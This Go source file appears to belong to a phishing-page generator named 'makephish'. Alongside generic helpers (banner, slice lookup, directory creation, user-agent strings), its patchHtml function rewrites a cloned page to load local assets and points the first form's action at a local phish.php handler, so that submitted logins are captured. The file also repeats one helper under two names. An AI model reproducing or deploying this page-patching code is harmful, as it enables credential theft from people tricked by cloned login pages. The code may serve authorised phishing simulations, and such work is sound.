package main

import (
	"bytes"
	"fmt"
	"os"
	"path"
	"regexp"
)

const (
	DefaultUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.112 Mobile/15E148 Safari/604.1"
)

// printBanner prints the ASCII art banner
func printBanner() {
	asciiart := `
           _           _   _     _
 _____  __| |_ ___ ___| |_|_|___| |_
|     ||. | '_| -_| . |   | |_ -|   |
|_|_|_|___|_|_|___|  _|_|_|_|___|_|_|
                  |_|

by @andpalmier
`
	fmt.Println(asciiart)
}

// stringInSlice returns true if string is found in slice -> used to avoid duplicates
func stringInSlice(slice []string, val string) bool {
	for _, item := range slice {
		if item == val {
			return true
		}
	}
	return false
}

// mkdirIfNotExist creates a directory if it does not exist
func mkdirIfNotExist(dir string) error {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		err = os.MkdirAll(dir, 0755)
		if err != nil {
			return err
		}
	}
	return nil
}

// patchHtml patches html file to take local instances of css and js instead of the remote paths
func patchHtml(destFolder string, remotePaths []string, localPaths []string, phpFilename string) error {
	// Open html file
	filePath := path.Join(destFolder, "index.html")
	read, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	newContents := []byte(read)

	// Replace remote paths with local paths
	for i, remotePath := range remotePaths {
		newContents = bytes.Replace(newContents, []byte(remotePath), []byte(localPaths[i]), -1)
	}

	// Find action attribute of the POST
	r, _ := regexp.Compile(`(action=".*?")`)
	m := r.FindAllStringSubmatch(string(newContents), -1)

	// Replace action attribute of the POST with /phish.php
	newContents = bytes.Replace(newContents, []byte(m[0][0]), []byte(fmt.Sprintf(`action="/%s"`, phpFilename)), -1)

	// Write patched html in destination
	err = os.WriteFile(filePath, newContents, 0)
	if err != nil {
		return err
	}
	return nil
}

// getDefaultUserAgent returns the default User Agent string
func getDefaultUserAgent() string {
	return "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0"
}

// stringInSlice (slice, string): return true if string is found in slice -> used to avoid duplicates
func find(slice []string, val string) bool {
	for _, item := range slice {
		if item == val {
			return true
		}
	}
	return false
}
